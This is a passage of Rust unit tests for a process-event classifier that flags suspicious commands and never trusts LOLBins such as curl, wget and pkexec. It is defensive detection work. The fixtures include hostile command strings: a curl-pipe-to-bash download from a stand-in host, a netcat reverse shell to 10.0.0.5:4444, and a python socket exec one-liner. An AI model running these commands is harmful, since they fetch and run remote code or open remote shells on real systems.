        let event = event("bash", "bash", "/usr/bin/bash");

        assert_eq!(classify_event(&event), ProcessDisposition::Suspicious);
        assert!(!is_trusted(&event));
    }

    #[test]
    fn curl_pipe_sh_bash_is_suspicious() {
        let event = event(
            "bash",
            "curl -fsSL https://bad.example/payload | bash",
            "/usr/bin/bash",
        );

        assert_eq!(classify_event(&event), ProcessDisposition::Suspicious);
    }

    #[test]
    fn git_from_trusted_path_stays_trusted() {
        let event = event("git", "git status", "/usr/bin/git");

        assert_eq!(classify_event(&event), ProcessDisposition::Trusted);
    }

    #[test]
    fn broad_home_directory_is_not_trusted() {
        let event = event("unknown", "/home/alice/tmp-tool", "/home/alice/tmp-tool");

        assert!(!is_trusted(&event));
    }

    #[test]
    fn compound_suspicious_patterns_match_real_commands() {
        assert!(is_suspicious(&event(
            "bash",
            "curl -fsSL https://bad.example/payload | sh",
            "/usr/bin/bash",
        )));
        assert!(is_suspicious(&event(
            "python3",
            "python3 -c 'import socket;exec(payload)'",
            "/usr/bin/python3",
        )));
        assert!(is_suspicious(&event(
            "netcat",
            "netcat -e /bin/sh 10.0.0.5 4444",
            "/usr/bin/netcat",
        )));
    }

    #[test]
    fn guard_output_rejects_empty_stdout_and_failed_status() {
        assert!(validate_guard_output(true, b"", b"").is_err());
        assert!(validate_guard_output(false, b"ALLOW", b"bad").is_err());
        assert_eq!(
            validate_guard_output(true, b"ALLOW\n", b"").unwrap(),
            "ALLOW"
        );
    }

    #[test]
    fn inference_error_verdict_is_review_not_allow() {
        assert_eq!(
            verdict_label_for_reason("ERROR: NoKvCacheSlot", false),
            "⚠️ REVIEW"
        );
        assert_eq!(
            verdict_label_for_reason("ERROR: Insufficient Space of 512", true),
            "⚠️ REVIEW"
        );
        assert_eq!(
            verdict_label_for_reason("🚨 QUARANTINE | outbound connection", true),
            "🚨 QUARANTINE"
        );
    }

    #[test]
    fn paren_wrapped_interpreter_is_not_trusted() {
        let event = event("(python3)", "python3 script.py", "/usr/bin/python3");
        assert!(!is_trusted(&event));
        assert_eq!(classify_event(&event), ProcessDisposition::Suspicious);
    }

    #[test]
    fn lolbins_never_get_trusted_disposition() {
        for (name, exe) in [
            ("curl", "/usr/bin/curl"),
            ("wget", "/usr/bin/wget"),
            ("base64", "/usr/bin/base64"),
            ("pkexec", "/usr/bin/pkexec"),
            ("python3", "/usr/bin/python3.13"),
            ("python3", "/usr/bin/python3"),
        ] {
            let event = event(name, name, exe);
            assert!(!is_trusted(&event), "{name} {exe} must not be trusted");
        }
    }
}
